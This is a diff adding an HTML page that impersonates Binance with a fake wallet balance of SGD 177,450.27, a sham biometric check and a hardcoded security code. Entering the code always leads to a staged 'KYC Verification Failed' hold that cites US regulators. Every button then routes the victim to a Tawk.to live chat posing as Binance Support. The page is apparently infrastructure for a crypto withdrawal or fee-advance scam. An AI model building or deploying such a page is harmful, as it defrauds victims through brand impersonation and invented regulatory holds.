@@ -1,1 +1,464 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binance Protocol Index</title>
+    <!-- Core Bootstrap 5 CDN Link -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --term-dark-bg: #0b0e11;
+            --term-panel-dark: #12161a;
+            --term-card-gray: #1e2329;
+            --term-accent-gold: #f0b90b;
+            --term-gold-hover: #d4a30a;
+            --term-border: #2b3139;
+            --term-text-muted: #848e9c;
+            --success-green: #0ecb81;
+            --error-red: #f6465d;
+        }
+
+        body.terminal-layout {
+            background-color: var(--term-dark-bg) !important;
+            color: #eaecef !important;
+            font-family: system-ui, -apple-system, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        .terminal-top-bar {
+            background-color: var(--term-panel-dark);
+            border-bottom: 1px solid var(--term-border);
+            padding: 18px 0;
+        }
+
+        .app-flow-card {
+            background-color: var(--term-card-gray) !important;
+            border: 1px solid var(--term-border) !important;
+            border-radius: 12px;
+            padding: 35px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+            margin-top: 30px;
+            width: 100%;
+        }
+
+        .term-input-field {
+            background-color: var(--term-panel-dark) !important;
+            border: 1px solid #474d57 !important;
+            color: #ffffff !important;
+            border-radius: 8px;
+            padding: 12px;
+            width: 100%;
+            font-size: 1rem;
+        }
+        .term-input-field:focus {
+            border-color: var(--term-accent-gold) !important;
+            box-shadow: none !important;
+            color: #ffffff !important;
+        }
+
+        .btn-term-gold {
+            background-color: var(--term-accent-gold) !important;
+            color: #000000 !important;
+            font-weight: 700;
+            border-radius: 8px;
+            border: none;
+            padding: 14px;
+            transition: all 0.2s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+        .btn-term-gold:hover {
+            background-color: var(--term-gold-hover) !important;
+            transform: translateY(-1px);
+            text-decoration: none;
+            color: #000000 !important;
+        }
+
+        .highlight-box {
+            background-color: rgba(240, 185, 11, 0.1);
+            border-left: 4px solid var(--term-accent-gold);
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 4px;
+        }
+
+        .error-highlight-box {
+            background-color: rgba(246, 70, 93, 0.1);
+            border-left: 4px solid var(--error-red);
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 4px;
+        }
+
+        .code-details-block {
+            background-color: rgba(30, 35, 41, 0.8);
+            border: 1px solid var(--term-border);
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+
+        .btn-message {
+            background-color: var(--term-accent-gold) !important;
+            color: #000000 !important;
+            font-weight: 700;
+            border-radius: 8px;
+            border: none;
+            padding: 14px;
+            transition: all 0.2s ease;
+            cursor: pointer;
+            width: 100%;
+            text-transform: uppercase;
+            margin-top: 15px;
+            text-decoration: none;
+            display: block;
+        }
+
+        .btn-message:hover {
+            background-color: var(--term-gold-hover) !important;
+            transform: translateY(-1px);
+            text-decoration: none;
+            color: #000000 !important;
+        }
+
+        .btn-dispute {
+            background-color: var(--error-red) !important;
+            color: #ffffff !important;
+            font-weight: 700;
+            border-radius: 8px;
+            border: none;
+            padding: 14px;
+            transition: all 0.2s ease;
+            cursor: pointer;
+            width: 100%;
+            text-transform: uppercase;
+            margin-top: 15px;
+            text-decoration: none;
+            display: block;
+        }
+
+        .btn-dispute:hover {
+            background-color: #e63550 !important;
+            transform: translateY(-1px);
+            text-decoration: none;
+            color: #ffffff !important;
+        }
+
+        .biometric-icon {
+            font-size: 4rem;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+
+        /* Live Agent Widget Styling */
+        .live-agent-widget {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            z-index: 999;
+        }
+
+        .agent-bubble {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, var(--term-accent-gold) 0%, #d4a30a 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(240, 185, 11, 0.3);
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .agent-bubble:hover {
+            transform: scale(1.1);
+            box-shadow: 0 6px 16px rgba(240, 185, 11, 0.5);
+        }
+
+        .agent-logo {
+            font-size: 2.5rem;
+        }
+
+        .agent-status {
+            position: absolute;
+            bottom: 5px;
+            right: 5px;
+            width: 16px;
+            height: 16px;
+            background-color: var(--success-green);
+            border-radius: 50%;
+            border: 2px solid var(--term-accent-gold);
+        }
+
+        .agent-profile-avatar {
+            width: 50px;
+            height: 50px;
+            background: var(--term-accent-gold);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 1.5rem;
+            color: #000000;
+            font-family: Arial, sans-serif;
+        }
+
+        .agent-tooltip {
+            position: absolute;
+            bottom: 90px;
+            right: 0;
+            background-color: var(--term-card-gray);
+            border: 2px solid var(--term-accent-gold);
+            border-radius: 8px;
+            padding: 12px 15px;
+            white-space: nowrap;
+            color: var(--term-accent-gold);
+            font-weight: 700;
+            font-size: 0.85rem;
+            display: none;
+        }
+
+        .agent-bubble:hover .agent-tooltip {
+            display: block;
+        }
+    </style>
+</head>
+<body class="terminal-layout">
+
+    <!-- APPLICATION HEADER -->
+    <header class="terminal-top-bar">
+        <div class="container d-flex justify-content-between align-items-center">
+            <div class="fw-bold text-white fs-5" style="letter-spacing: 0.5px;">
+                <span style="color: var(--term-accent-gold);">SOVEREIGN</span> BINANCE PROTOCOL
+            </div>
+            <span class="badge bg-dark border border-secondary text-white-50 px-3 py-2" style="font-size: 0.75rem;">BINANCE  COMPLIANCE SECURITY</span>
+        </div>
+    </header>
+
+    <div class="container pb-5">
+        <div class="row justify-content-center">
+            <div class="col-md-8 col-lg-6">
+
+                <!-- STEP 1: WALLET HOME -->
+                <div id="layerWallet" class="app-flow-card text-center">
+                    <h3 class="fw-bold mb-2 text-white">Digital Asset Wallet</h3>
+                    <p style="color: var(--term-text-muted);" class="small mb-4">Premium Account Status: ACTIVE</p>
+                    
+                    <div class="p-3 mb-4 rounded border border-secondary" style="background-color: var(--term-panel-dark);">
+                        <small class="text-muted d-block small fw-bold tracking-wider">BASE ASSET BALANCE</small>
+                        <h3 class="fw-bold my-1" style="color: var(--success-green); font-family: monospace;">177,450.27 SGD</h3>
+                    </div>
+
+                    <p class="small text-white-50 text-start mb-4">Manage your asset allocation and execute withdrawal requests through the secure routing interface.</p>
+                    <button class="btn-term-gold w-100 text-uppercase" onclick="showBiometricVerification()">Initiate Withdrawal</button>
+                </div>
+
+                <!-- STEP 2: BIOMETRIC VERIFICATION -->
+                <div id="layerBiometricVerification" class="app-flow-card d-none text-center">
+                    <div class="biometric-icon">🔐</div>
+                    <h3 class="fw-bold mb-2 text-white">Biometric Verification Required</h3>
+                    <p style="color: var(--term-text-muted);" class="small mb-4">Verify your identity using facial recognition or fingerprint to proceed with the withdrawal.</p>
+                    
+                    <div class="mb-4 p-4 rounded" style="background-color: var(--term-panel-dark); border: 2px dashed var(--term-border);">
+                        <p class="text-muted small mb-0">Scanning biometric data...</p>
+                        <p style="color: var(--term-accent-gold);" class="fw-bold mt-2">📹 Position your face in the camera</p>
+                    </div>
+
+                    <button class="btn-term-gold w-100 text-uppercase" onclick="executeBiometricVerification()">Verify Biometric</button>
+                    <button class="btn-message" onclick="switchToWallet()" style="background-color: var(--term-border); margin-top: 10px;">Cancel</button>
+                </div>
+
+                <!-- STEP 3: SECURITY AUTHENTICATION INPUT -->
+                <div id="layerPINVerification" class="app-flow-card d-none text-center">
+                    <h3 class="fw-bold mb-2 text-white">Security Sign-Off Required</h3>
+                    <p style="color: var(--term-text-muted);" class="small mb-4">Input the 6-digit security code to authorize the withdrawal of SGD 177,450.27.</p>
+                    
+                    <div class="mb-4">
+                        <input type="password" id="pinVerificationInput" class="form-control term-input-field text-center fs-2 tracking-widest mx-auto" style="max-width: 220px;" maxlength="6" placeholder="●●●●●●">
+                    </div>
+                    <button class="btn-term-gold w-100 text-uppercase" onclick="executeTokenValidation()">Execute Signature Verification</button>
+                </div>
+
+                <!-- STEP 4: PROCESSING RUNTIME SPINNER -->
+                <div id="layerLoadingWheel" class="app-flow-card d-none text-center py-5">
+                    <div class="spinner-border mb-3" style="width: 3.5rem; height: 3.5rem; color: var(--term-accent-gold);" role="status"></div>
+                    <h4 class="text-white">Processing Transaction Authorization...</h4>
+                    <p class="text-muted small mb-0">Validating security parameters and preparing asset transfer.</p>
+                </div>
+
+                <!-- STEP 5: KYC FAILED - INSUFFICIENT DOCUMENTS -->
+                <div id="layerKYCFailed" class="app-flow-card d-none text-center">
+                    <div class="d-flex align-items-center gap-3 mb-3 justify-content-center">
+                        <h3 class="m-0" style="color: var(--error-red); font-size: 3rem;">✕</h3>
+                    </div>
+                    <h4 class="fw-bold m-0 text-white mb-3">KYC Verification Failed</h4>
+                    <hr class="border-secondary">
+                    
+                    <div class="security-notice-text small text-white-50 mb-4">
+                        <p class="mb-3"><strong>Status:</strong> WITHDRAWAL FAILED - INSUFFICIENT DOCUMENTS</p>
+                        <p class="mb-3">US Department of the Treasury's FinCEN (Financial Crimes Enforcement Network) mandates, the Bank Secrecy Act (BSA), and the SEC (Securities.</p>
+                        <p class="mb-3">and Exchange Commission) cross-border digital asset guidelines, withdrawal access is restricted until identity verification is fully remediated.</p>
+                        
+                        <div class="error-highlight-box text-white">
+                            <p class="mb-2"><strong>⚠️ Account Status:</strong></p>
+                            <p class="m-0">FUNDS ON HOLD - KYC VERIFICATION FAILED</p>
+                        </div>
+
+                        <div class="code-details-block">
+                            <p class="m-0 text-danger fw-bold">ACCOUNT REFERENCE:</p>
+                            <p class="m-0" id="failedRef">***-****-258349</p>
+                            <p class="m-0">Amount: SGD 177,450.27</p>
+                            <p class="m-0">Status: ✕ HOLD - INSUFFICIENT DOCUMENTS</p>
+                            <p class="m-0 mt-2">Reason: KYC verification documents incomplete</p>
+                        </div>
+                    </div>
+
+                    <p class="text-muted small mb-3">Need to dispute this decision or resubmit documents?</p>
+                    <button class="btn-dispute" onclick="openLiveChat()">🔴 Open Dispute & Chat with Binance Support</button>
+                    <button class="btn-message" onclick="openLiveChat()">📨 Resubmit Documents</button>
+                </div>
+
+                <!-- STEP 6: SUCCESS COMPLETION -->
+                <div id="layerSuccess" class="app-flow-card d-none text-center">
+                    <div class="d-flex align-items-center gap-3 mb-3 justify-content-center">
+                        <h3 class="m-0" style="color: var(--success-green); font-size: 3rem;">✓</h3>
+                    </div>
+                    <h4 class="fw-bold m-0 text-white mb-3">Transaction Completed Successfully</h4>
+                    <hr class="border-secondary">
+                    
+                    <div class="security-notice-text small text-white-50">
+                        <p class="mb-3"><strong>Status:</strong> WITHDRAWAL AUTHORIZED & PROCESSING</p>
+                        <p class="mb-3">Your asset transfer has been successfully verified and approved for execution.</p>
+                        
+                        <div class="highlight-box text-white">
+                            <p class="fw-bold mb-2">✓ Transfer Details Confirmed</p>
+                            <p class="mb-0">SGD 177,450.27 will arrive after the verification</p>
+                        </div>
+
+                        <div class="code-details-block">
+                            <p class="m-0 text-success fw-bold">TRANSACTION CONFIRMATION:</p>
+                            <p class="m-0" id="successTxnRef">***-****-258349</p>
+                            <p class="m-0">Amount: SGD 177,450.27</p>
+                            <p class="m-0">Status: ✓ AUTHORIZED</p>
+                            <p class="m-0">Execution: Automatic Processing</p>
+                        </div>
+                    </div>
+
+                    <button class="btn-term-gold w-100 mt-4 text-uppercase" onclick="resetWorkflowIndex()">Return to Wallet</button>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <!-- LIVE AGENT WIDGET -->
+    <div class="live-agent-widget">
+        <div class="agent-bubble" onclick="openLiveChat()">
+            <div class="agent-profile-avatar">B</div>
+            <div class="agent-status"></div>
+            <div class="agent-tooltip">Live Agent Support</div>
+        </div>
+    </div>
+
+    <!-- JAVASCRIPT STATE CONTROLLER MATRIX -->
+    <script>
+        // Tawk.to embed script
+        var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+        (function(){
+            var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+            s1.async=true;
+            s1.src='https://embed.tawk.to/6a1cd8c4e717081c2b47ed79/default4';
+            s1.charset='UTF-8';
+            s1.setAttribute('crossorigin','*');
+            s0.parentNode.insertBefore(s1,s0);
+        })();
+
+        // State machine visibility toggle utility
+        function switchState(hideElementId, showElementId) {
+            const hideTarget = document.getElementById(hideElementId);
+            const showTarget = document.getElementById(showElementId);
+            
+            if (hideTarget && showTarget) {
+                hideTarget.classList.add('d-none');
+                showTarget.classList.remove('d-none');
+            }
+        }
+
+        // Show biometric verification layer
+        function showBiometricVerification() {
+            switchState('layerWallet', 'layerBiometricVerification');
+        }
+
+        // Switch back to wallet
+        function switchToWallet() {
+            switchState('layerBiometricVerification', 'layerWallet');
+        }
+
+        // Execute biometric verification
+        function executeBiometricVerification() {
+            // Simulate biometric processing delay
+            const biometricIcon = document.querySelector('.biometric-icon');
+            if (biometricIcon) {
+                biometricIcon.textContent = '✓';
+                biometricIcon.style.color = 'var(--success-green)';
+            }
+            
+            setTimeout(function() {
+                switchState('layerBiometricVerification', 'layerPINVerification');
+                // Reset biometric icon for next cycle
+                if (biometricIcon) {
+                    biometricIcon.textContent = '🔐';
+                    biometricIcon.style.color = 'inherit';
+                }
+            }, 2000);
+        }
+
+        // Process secure code input logic checks
+        function executeTokenValidation() {
+            const secretCodeField = document.getElementById('pinVerificationInput');
+            
+            // Dynamic input validation evaluation matching lab parameters
+            if (secretCodeField && secretCodeField.value.trim() === "120352") {
+                switchState('layerPINVerification', 'layerLoadingWheel');
+                
+                // Emulates an algorithmic execution processing delay before KYC failed state
+                setTimeout(function() {
+                    switchState('layerLoadingWheel', 'layerKYCFailed');
+                }, 3000);
+            } else {
+                alert("Security matrix mismatch: Input parameters incorrect.");
+            }
+        }
+
+        // Clean structural variables state baseline back to origin
+        function resetWorkflowIndex() {
+            const targetPin = document.getElementById('pinVerificationInput');
+            
+            if (targetPin) targetPin.value = '';
+            
+            switchState('layerSuccess', 'layerWallet');
+        }
+
+        // Open live chat widget - triggers Tawk.to chat
+        function openLiveChat() {
+            if (typeof Tawk_API !== 'undefined') {
+                Tawk_API.toggle();
+            }
+        }
+    </script>
+
+</body>
+</html>
